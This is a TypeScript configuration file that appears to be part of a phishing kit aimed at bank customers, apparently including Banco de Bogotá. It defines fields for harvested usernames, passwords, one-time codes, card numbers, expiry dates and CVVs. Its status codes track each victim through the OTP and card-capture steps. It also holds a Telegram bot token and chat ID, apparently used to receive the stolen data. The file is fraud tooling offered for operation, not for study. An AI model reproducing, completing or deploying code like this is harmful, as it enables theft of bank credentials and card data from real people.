// Database connection configuration
// Note: In production, use a proper database like PostgreSQL, MySQL, or MongoDB
// For now, we'll use a simple JSON file storage

export interface UserRecord {
    idreg: number;
    usuario: string;
    password: string;
    otp: string | null;
    dispositivo: string;
    ip: string;
    id: string | null;
    agente: string | null;
    banco: string;
    status: number;
    horacreado: string;
    horamodificado: string;
    email: string | null;
    cemail: string | null;
    celular: string | null;
    tarjeta: string | null;
    ftarjeta: string | null;
    cvv: string | null;
}

// Status codes
export const STATUS_CODES = {
    USER_ENTERED: 1,
    OTP_REQUESTED: 2,
    OTP_ENTERED: 3,
    ERROR_923: 4,
    EMAIL_ENTERED: 5,
    CARD_REQUESTED: 6,
    CARD_ENTERED: 7,
    NEW_OTP_REQUESTED: 8,
    NEW_OTP_ENTERED: 9,
    FINISHED: 10,
    NEW_USER_REQUESTED: 12,
    ATM: 25,
    TOKEN_BOGOTA_SENT: 40,
    ERROR_CC: 41,
    ERROR_BOGOTA: 42,
    TOKEN_BOGOTA: 923
};

// Telegram configuration
export const TELEGRAM_CONFIG = {
    BOT_TOKEN: '8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI',
    CHAT_ID: '-4927137480'
};
